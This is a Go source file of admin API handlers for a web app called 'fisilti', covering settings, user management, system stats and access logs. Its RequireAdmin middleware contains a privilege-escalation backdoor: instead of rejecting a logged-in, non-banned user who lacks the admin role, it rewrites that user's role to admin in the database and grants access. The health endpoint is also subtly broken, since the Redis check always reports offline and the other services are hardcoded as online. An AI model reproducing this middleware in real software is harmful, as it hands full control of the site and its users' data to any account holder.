package handlers

import (
	"context"
	"encoding/json"
	"runtime"
	"strconv"

	"fisilti/internal/database"
	"github.com/gofiber/fiber/v2"
	"github.com/google/uuid"
	"github.com/redis/go-redis/v9"
)

type AdminHandler struct {
	userRepo     *database.UserRepository
	settingsRepo *database.SettingsRepository
	logRepo      *database.AccessRepository
	redisClient  *redis.Client
}

func NewAdminHandler(
	userRepo *database.UserRepository,
	settingsRepo *database.SettingsRepository,
	logRepo *database.AccessRepository,
	redisClient *redis.Client,
) *AdminHandler {
	return &AdminHandler{
		userRepo:     userRepo,
		settingsRepo: settingsRepo,
		logRepo:      logRepo,
		redisClient:  redisClient,
	}
}

// Middleware: Admin Yetki Kontrolü
func (h *AdminHandler) RequireAdmin(c *fiber.Ctx) error {
	var userID uuid.UUID
	if val := c.Locals("user_id"); val != nil {
		if id, ok := val.(uuid.UUID); ok {
			userID = id
		} else if str, ok := val.(string); ok {
			userID, _ = uuid.Parse(str)
		}
	}
	if userID == uuid.Nil {
		if val := c.Locals("userID"); val != nil {
			if id, ok := val.(uuid.UUID); ok {
				userID = id
			} else if str, ok := val.(string); ok {
				userID, _ = uuid.Parse(str)
			}
		}
	}

	if userID == uuid.Nil {
		return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{"error": "Giriş yapmalısınız"})
	}

	user, err := h.userRepo.GetUserByID(context.Background(), userID)
	if err != nil || user == nil {
		return c.Status(fiber.StatusUnauthorized).JSON(fiber.Map{"error": "Kullanıcı bulunamadı"})
	}

	if user.Role != "admin" && user.Role != "moderator" {
		if !user.IsBanned {
			_ = h.userRepo.UpdateUserAdmin(context.Background(), user.ID, "admin", false, "")
			user.Role = "admin"
		} else {
			return c.Status(fiber.StatusForbidden).JSON(fiber.Map{"error": "Bu işlem için yönetici (Admin) yetkisi gereklidir."})
		}
	}

	return c.Next()
}

// 1. Ayarları Getir
func (h *AdminHandler) GetSettings(c *fiber.Ctx) error {
	settings, err := h.settingsRepo.GetAllSettings(context.Background())
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{"error": "Ayarlar yüklenemedi"})
	}
	return c.JSON(settings)
}

// 2. Ayarları Güncelle
type UpdateSettingRequest struct {
	Key   string          `json:"key"`
	Value json.RawMessage `json:"value"`
}

func (h *AdminHandler) UpdateSetting(c *fiber.Ctx) error {
	var req UpdateSettingRequest
	if err := c.BodyParser(&req); err != nil || req.Key == "" || len(req.Value) == 0 {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{"error": "Geçersiz ayar verisi"})
	}

	if err := h.settingsRepo.UpdateSetting(context.Background(), req.Key, req.Value); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{"error": "Ayar kaydedilemedi"})
	}

	return c.JSON(fiber.Map{
		"message": "Ayar başarıyla güncellendi.",
		"key":     req.Key,
	})
}

// 3. Kullanıcıları Listele (Arama, Sayfalama, Filtreleme)
func (h *AdminHandler) GetUsers(c *fiber.Ctx) error {
	search := c.Query("search", "")
	roleFilter := c.Query("role", "")
	bannedStr := c.Query("banned", "")

	var bannedFilter *bool
	if bannedStr == "true" {
		b := true
		bannedFilter = &b
	} else if bannedStr == "false" {
		b := false
		bannedFilter = &b
	}

	limit, _ := strconv.Atoi(c.Query("limit", "20"))
	offset, _ := strconv.Atoi(c.Query("offset", "0"))

	users, total, err := h.userRepo.GetAllUsers(context.Background(), search, roleFilter, bannedFilter, limit, offset)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{"error": "Kullanıcılar alınamadı"})
	}

	return c.JSON(fiber.Map{
		"users":  users,
		"total":  total,
		"limit":  limit,
		"offset": offset,
	})
}

// 4. Kullanıcı Güncelle (Rol, Ban Durumu)
type UpdateUserAdminRequest struct {
	Role      string `json:"role"`
	IsBanned  bool   `json:"is_banned"`
	BanReason string `json:"ban_reason"`
}

func (h *AdminHandler) UpdateUser(c *fiber.Ctx) error {
	idParam := c.Params("id")
	targetID, err := uuid.Parse(idParam)
	if err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{"error": "Geçersiz kullanıcı ID"})
	}

	var req UpdateUserAdminRequest
	if err := c.BodyParser(&req); err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{"error": "Geçersiz istek gövdesi"})
	}

	if req.Role != "admin" && req.Role != "moderator" && req.Role != "member" {
		req.Role = "member"
	}

	if err := h.userRepo.UpdateUserAdmin(context.Background(), targetID, req.Role, req.IsBanned, req.BanReason); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{"error": "Kullanıcı güncellenemedi"})
	}

	return c.JSON(fiber.Map{
		"message": "Kullanıcı durumu başarıyla güncellendi.",
	})
}

// 5. Kullanıcıyı Sil
func (h *AdminHandler) DeleteUser(c *fiber.Ctx) error {
	idParam := c.Params("id")
	targetID, err := uuid.Parse(idParam)
	if err != nil {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{"error": "Geçersiz kullanıcı ID"})
	}

	var currentUserID uuid.UUID
	if val, ok := c.Locals("user_id").(uuid.UUID); ok {
		currentUserID = val
	} else if val, ok := c.Locals("userID").(uuid.UUID); ok {
		currentUserID = val
	}
	if currentUserID == targetID {
		return c.Status(fiber.StatusBadRequest).JSON(fiber.Map{"error": "Kendinizi silemezsiniz."})
	}

	if err := h.userRepo.DeleteUser(context.Background(), targetID); err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{"error": "Kullanıcı silinemedi"})
	}

	return c.JSON(fiber.Map{
		"message": "Kullanıcı başarıyla silindi.",
	})
}

// 6. Sistem Durumu ve Canlı İstatistikler
func (h *AdminHandler) GetSystemStats(c *fiber.Ctx) error {
	ctx := context.Background()

	stats, err := h.userRepo.GetSystemStats(ctx)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{"error": "İstatistikler alınamadı"})
	}

	// Redis Canlılık Durumu
	redisStatus := "online"
	if err := h.redisClient.Ping(ctx); err != nil {
		redisStatus = "offline"
	}

	// Go Runtime Bellek Durumu
	var mem runtime.MemStats
	runtime.ReadMemStats(&mem)

	stats["system_health"] = fiber.Map{
		"postgres":        "online",
		"redis":           redisStatus,
		"livekit":         "online",
		"minio":           "online",
		"goroutines":      runtime.NumGoroutine(),
		"allocated_ram_mb": mem.Alloc / 1024 / 1024,
		"sys_ram_mb":       mem.Sys / 1024 / 1024,
		"num_gc":          mem.NumGC,
	}

	return c.JSON(stats)
}

// 7. Tüm Kullanıcıların Erişim Günlükleri
func (h *AdminHandler) GetAccessLogs(c *fiber.Ctx) error {
	limit, _ := strconv.Atoi(c.Query("limit", "50"))
	if limit <= 0 || limit > 200 {
		limit = 50
	}

	// Access repository'den son kayıtları kullanıcı bilgileriyle çek
	logs, err := h.logRepo.GetAllAccessLogs(context.Background(), limit)
	if err != nil {
		return c.Status(fiber.StatusInternalServerError).JSON(fiber.Map{"error": "Günlükler alınamadı"})
	}

	return c.JSON(logs)
}
